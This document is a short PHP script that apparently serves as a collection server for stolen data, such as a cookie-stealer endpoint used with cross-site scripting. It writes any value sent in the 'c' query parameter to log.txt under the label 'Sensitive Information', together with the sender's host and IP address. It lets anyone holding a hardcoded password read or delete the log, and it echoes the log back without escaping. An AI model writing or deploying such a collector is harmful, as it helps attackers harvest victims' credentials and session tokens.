<?php
 
#error_reporting(0);
 
$filename = 'log.txt';
$password = 'pass';
 
if (!file_exists($filename)) {
    if ($fh = fopen($filename, 'w')) {
        fclose($fh);
    }
}
 
if (isset($_GET['c'])) {
    $content = '[Host]: ' . $_SERVER['REMOTE_HOST'] . PHP_EOL;
    $content .= '[Remote Addr]: ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL;
    $content .= '[Sensitive Information]: ' . $_GET['c'] . PHP_EOL;
    $content .= PHP_EOL . PHP_EOL;
    file_put_contents($filename, $content, FILE_APPEND | LOCK_EX);
}
 
if (isset($_GET['p'])) {
 
    if ($_GET['p'] == $password) {
        if (isset($_GET['rm'])) {
            unlink($filename);
        } else {
            $data = file_get_contents($filename);
            $convert = explode("\n", $data);
            for ($i = 0; $i < count($convert); $i++) {
                echo $convert[$i] . '</br>';
            }
        }
    }
}